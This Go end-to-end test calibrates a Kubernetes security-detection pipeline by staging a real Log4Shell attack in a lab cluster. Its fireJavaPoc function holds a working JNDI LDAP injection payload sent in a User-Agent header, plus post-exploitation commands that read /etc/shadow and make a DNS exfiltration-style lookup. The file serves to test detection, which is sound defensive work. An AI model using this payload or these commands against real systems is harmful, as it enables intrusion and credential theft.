// Copyright 2018- The Pixie Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package aeloadsuite

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

// TestJavaPocCalibration is the true end-to-end calibration: it ASSUMES the full
// SOC stack is deployed (kubescape + vector + ClickHouse + adaptive_export + dx +
// the java-poc chain), fires the known java-poc disease once, and asserts every
// stage of the detection pipeline produces its expected signal. Unlike the
// control-plane suite (which injects synthetic kubescape_logs), nothing here is
// mocked — the signal originates from a real workload and flows through every
// component.
//
// Stages calibrated (each a before→after delta over the live pipeline):
//  1. kubescape detects the incident         → kubescape_logs gains R0001 (spawn) for java-poc
//  2. vector→ClickHouse carries it            → those rows are queryable, event_time is fresh ns
//  3. adaptive_export captures forensics      → conn_stats gains backend→pathogen:1389 (LDAP egress)
//  4. dx diagnoses it                         → dx rules in (non-blind verdict on the java-poc chain)
//
// Live + e2e gated: set AELOAD_LIVE=1 AELOAD_E2E=1. Requires kubectl in PATH.
func TestJavaPocCalibration(t *testing.T) {
	e := RequireLiveEnv(t)
	if os.Getenv("AELOAD_E2E") != "1" {
		t.Skip("AELOAD_E2E != 1 — java-poc calibration (induces a real disease) skipped")
	}
	c := loadCalibConfig()
	t.Logf("calibration: app=%s/%s  pathogen=%s/%s (LDAP :%s)  dx=%s/%s",
		c.appNS, c.backend, c.pathogenNS, c.pathogen, c.ldapPort, c.dxNS, c.dxDS)

	// -------- deploy the non-Pixie stack with one command (opt-in) --------
	// AELOAD_DEPLOY=1 stands the whole environment up (soc stack -> bob sbobs+apps)
	// via skaffold; otherwise this is a no-op and the precondition below asserts a
	// pre-deployed rig.
	EnsureE2EStack(t)

	// -------- preconditions: the stack is up --------
	t.Run("precondition/stack-present", func(t *testing.T) {
		requireRunning(t, e, c.dxNS, c.dxDS)
		requireRunning(t, e, "honey", "kubescape")
		requireRunning(t, e, "honey", "vector")
		requireRunning(t, e, e.AENS, e.AEDaemon)
		requireRunning(t, e, c.appNS, c.backend)
		requireRunning(t, e, c.pathogenNS, c.pathogen)
	})

	// -------- baseline snapshot --------
	base := calibSnapshot(t, e, c)
	t.Logf("baseline: r0001=%d ldap_egress=%d attribution=%d dx_ruleins=%d",
		base.r0001, base.ldapEgress, base.attribution, base.dxRuleins)

	// -------- fire the java-poc disease once --------
	fireJavaPoc(t, e, c)

	// let the chain propagate (kubescape alert → vector batch → CH → AE pull → dx workup)
	t.Log("settling for signal propagation …")
	waitUntil(90*time.Second, func() bool {
		return calibSnapshot(t, e, c).r0001 > base.r0001
	})
	after := calibSnapshot(t, e, c)
	t.Logf("after fire: r0001=%d ldap_egress=%d attribution=%d dx_ruleins=%d",
		after.r0001, after.ldapEgress, after.attribution, after.dxRuleins)

	// -------- stage assertions (calibration) --------
	t.Run("stage1/kubescape-detects", func(t *testing.T) {
		require.Greaterf(t, after.r0001, base.r0001,
			"no new R0001 for %s after fire — kubescape did not detect the spawn (check the vulnerable backend image + node-agent)", c.appNS)
	})
	t.Run("stage2/vector-to-clickhouse", func(t *testing.T) {
		fresh := strings.TrimSpace(e.Query(t,
			"SELECT fromUnixTimestamp64Nano(max(event_time)) > now()-300 FROM forensic_db.kubescape_logs WHERE RuntimeK8sDetails LIKE '%"+c.appNS+"%'"))
		require.Equalf(t, "1", fresh, "kubescape_logs for %s is not fresh — vector→ClickHouse not carrying the signal", c.appNS)
	})
	t.Run("stage3/adaptive_export-captures", func(t *testing.T) {
		// AE captured/steered the disease: adaptive_attribution gained rows for the
		// affected workload. (conn_stats.remote_port is not populated by Pixie here,
		// so port-based egress matching is unreliable — attribution growth is the
		// authoritative AE-capture signal.)
		require.Greaterf(t, after.attribution, base.attribution,
			"adaptive_attribution did not grow for %s — AE did not capture/steer the disease", c.backend)
	})
	t.Run("stage4/dx-rules-in", func(t *testing.T) {
		// Assert the CURRENT (fresh) backend pod gets a ruled_in verdict. A cumulative
		// count delta is unreliable — the log tail saturates with prior rule-ins and
		// dx's workup (referral->triage->workup->verdict) lags the fire by up to ~2min.
		// Poll the specific pod instead.
		pod := currentPod(c.appNS, "app="+c.backend)
		require.NotEmptyf(t, pod, "no %s pod found to check for a dx verdict", c.backend)
		if waitUntil(150*time.Second, func() bool { return dxRuledInPod(c, pod) }) {
			return
		}
		if dxBlind(t, e, c) {
			t.Fatalf("dx is BLIND on all nodes (bench unavailable) — it cannot rule in; deploy a working dx (non-blind broker/pemdirect) to calibrate this stage")
		}
		t.Fatalf("dx produced no ruled_in verdict for %s within 150s — the incident was not diagnosed", pod)
	})
}

type calibConfig struct {
	appNS, backend, pathogenNS, pathogen, ldapPort string
	dxNS, dxDS                                     string
	jndiHost, specimen                             string
}

func loadCalibConfig() calibConfig {
	c := calibConfig{
		appNS:      envOr("AELOAD_APP_NS", "java-poc"),
		backend:    envOr("AELOAD_BACKEND", "backend"),
		pathogenNS: envOr("AELOAD_PATHOGEN_NS", "pathogen-ns"),
		pathogen:   envOr("AELOAD_PATHOGEN", "pathogen"),
		ldapPort:   envOr("AELOAD_LDAP_PORT", "1389"),
		dxNS:       envOr("AELOAD_DX_NS", "honey"),
		dxDS:       envOr("AELOAD_DX_DS", "dx-daemon"),
	}
	c.jndiHost = envOr("AELOAD_JNDI_HOST", fmt.Sprintf("%s.%s.svc.cluster.local", c.pathogen, c.pathogenNS))
	c.specimen = envOr("AELOAD_SPECIMEN", "Specimen") // the LDAP reference the pathogen serves
	return c
}

type calibCounts struct{ r0001, ldapEgress, attribution, dxRuleins int }

func calibSnapshot(t *testing.T, e Env, c calibConfig) calibCounts {
	t.Helper()
	return calibCounts{
		r0001: e.QueryInt(t, fmt.Sprintf(
			"SELECT count() FROM forensic_db.kubescape_logs WHERE RuleID='R0001' AND RuntimeK8sDetails LIKE '%%%s%%'", c.appNS)),
		ldapEgress: e.QueryInt(t, fmt.Sprintf(
			"SELECT count() FROM forensic_db.conn_stats WHERE pod LIKE '%%%s%%' AND remote_port=%s", c.backend, c.ldapPort)),
		attribution: e.QueryInt(t, fmt.Sprintf(
			"SELECT count() FROM forensic_db.adaptive_attribution WHERE pod LIKE '%%%s%%'", c.backend)),
		dxRuleins: dxRuleinCount(t, e, c),
	}
}

// currentPod returns the first pod name matching selector in ns (or "").
func currentPod(ns, sel string) string {
	out, _ := exec.Command("kubectl", "-n", ns, "get", "pod", "-l", sel,
		"-o", "jsonpath={.items[0].metadata.name}").CombinedOutput()
	return strings.TrimSpace(string(out))
}

// dxRuledInPod reports whether any dx-daemon pod logged a ruled_in verdict for the
// exact pod (any playbook). Reads all dx pods (dx is a per-node DaemonSet).
func dxRuledInPod(c calibConfig, pod string) bool {
	out, _ := exec.Command("kubectl", "-n", c.dxNS, "logs", "ds/"+c.dxDS, "--tail=8000", "--all-pods=true").CombinedOutput()
	for _, ln := range strings.Split(string(out), "\n") {
		if strings.Contains(ln, "ruled_in") && strings.Contains(ln, pod) {
			return true
		}
	}
	return false
}

// dxRuleinCount counts ruled_in verdicts for the app across ALL dx-daemon pods
// (dx is a per-node DaemonSet; the backend can reschedule to any node, so we must
// read every pod's log, not just one).
func dxRuleinCount(t *testing.T, e Env, c calibConfig) int {
	out, _ := exec.Command("kubectl", "-n", c.dxNS, "logs", "ds/"+c.dxDS, "--tail=4000", "--all-pods=true").CombinedOutput()
	n := 0
	for _, ln := range strings.Split(string(out), "\n") {
		if strings.Contains(ln, "ruled_in") && strings.Contains(ln, c.appNS) {
			n++
		}
	}
	return n
}

// dxBlind is true only if EVERY dx pod is blind (bench unavailable) — if any node's
// dx is serving evidence, dx is not blind for the workload on that node.
func dxBlind(t *testing.T, e Env, c calibConfig) bool {
	out, _ := exec.Command("kubectl", "-n", c.dxNS, "logs", "ds/"+c.dxDS, "--tail=200", "--all-pods=true").CombinedOutput()
	// Not blind if any pod recently RECOVERED or produced a verdict for the app.
	if strings.Contains(string(out), "RECOVERED") || strings.Contains(string(out), "verdict "+c.appNS) {
		return false
	}
	return strings.Contains(string(out), "BLIND")
}

// fireJavaPoc reproduces the java-poc listeriosis (log4j) chain: a fresh-JVM backend, a JNDI
// lookup driving a backend→pathogen:1389 LDAP egress, and the post-lookup process
// activity kubescape flags (the disease presentation). Idempotent; best-effort (asserts are on the signals,
// not on kubectl exit codes).
func fireJavaPoc(t *testing.T, e Env, c calibConfig) {
	t.Helper()
	// fresh JVM clears the negative-DNS cache so the JNDI host resolves.
	kubeTry("-n", c.appNS, "delete", "pod", "-l", "app="+c.backend, "--wait=false")
	// poll (short 3s increments) for a fresh Running+Ready backend, then a brief
	// settle for Pixie re-attach — no long continuous sleep.
	waitUntil(120*time.Second, func() bool {
		out, _ := exec.Command("kubectl", "-n", c.appNS, "get", "pods", "-l", "app="+c.backend, "--no-headers").CombinedOutput()
		return strings.Contains(string(out), "Running") && strings.Contains(string(out), "1/1")
	})
	waitUntil(12*time.Second, func() bool { return false }) // ~12s Pixie re-attach, in 3s polls

	jndi := "${jndi:ldap://" + c.jndiHost + ":" + c.ldapPort + "/" + c.specimen + "}"
	// drive the vulnerable endpoint from the pathogen pod (JNDI in User-Agent).
	for i := 0; i < 5; i++ {
		kubeTry("-n", c.pathogenNS, "exec", "deploy/"+c.pathogen, "--",
			"curl", "-s", "-m5", "-A", jndi,
			fmt.Sprintf("http://%s.%s.svc:8080/api/products", c.backend, c.appNS))
	}
	// post-lookup activity in the backend that kubescape flags (R0001 spawn + R0010
	// sensitive-file read + a DNS exfil label) — the downstream detection signal.
	kubeTry("-n", c.appNS, "exec", "deploy/"+c.backend, "--", "sh", "-c",
		"whoami; id; cat /etc/shadow 2>/dev/null | head -1; "+
			"getent hosts exfil.$RANDOM.probe.internal >/dev/null 2>&1 || true")
	t.Log("java-poc disease fired (JNDI egress + post-lookup spawn)")
}

// ---- small live helpers ----

func requireRunning(t *testing.T, e Env, ns, sub string) {
	t.Helper()
	out, err := exec.Command("kubectl", "-n", ns, "get", "pods", "--no-headers").CombinedOutput()
	require.NoErrorf(t, err, "kubectl get pods -n %s", ns)
	for _, ln := range strings.Split(string(out), "\n") {
		if strings.Contains(ln, sub) && strings.Contains(ln, "Running") {
			return
		}
	}
	t.Fatalf("no Running pod matching %q in ns %s", sub, ns)
}

func kubeTry(args ...string) { _ = exec.Command("kubectl", args...).Run() }

// waitUntil polls cond every 3s until it is true or d elapses. Returns whether
// cond was met (callers that don't care may ignore the result).
func waitUntil(d time.Duration, cond func() bool) bool {
	deadline := time.Now().Add(d)
	for time.Now().Before(deadline) {
		if cond() {
			return true
		}
		time.Sleep(3 * time.Second)
	}
	return cond()
}
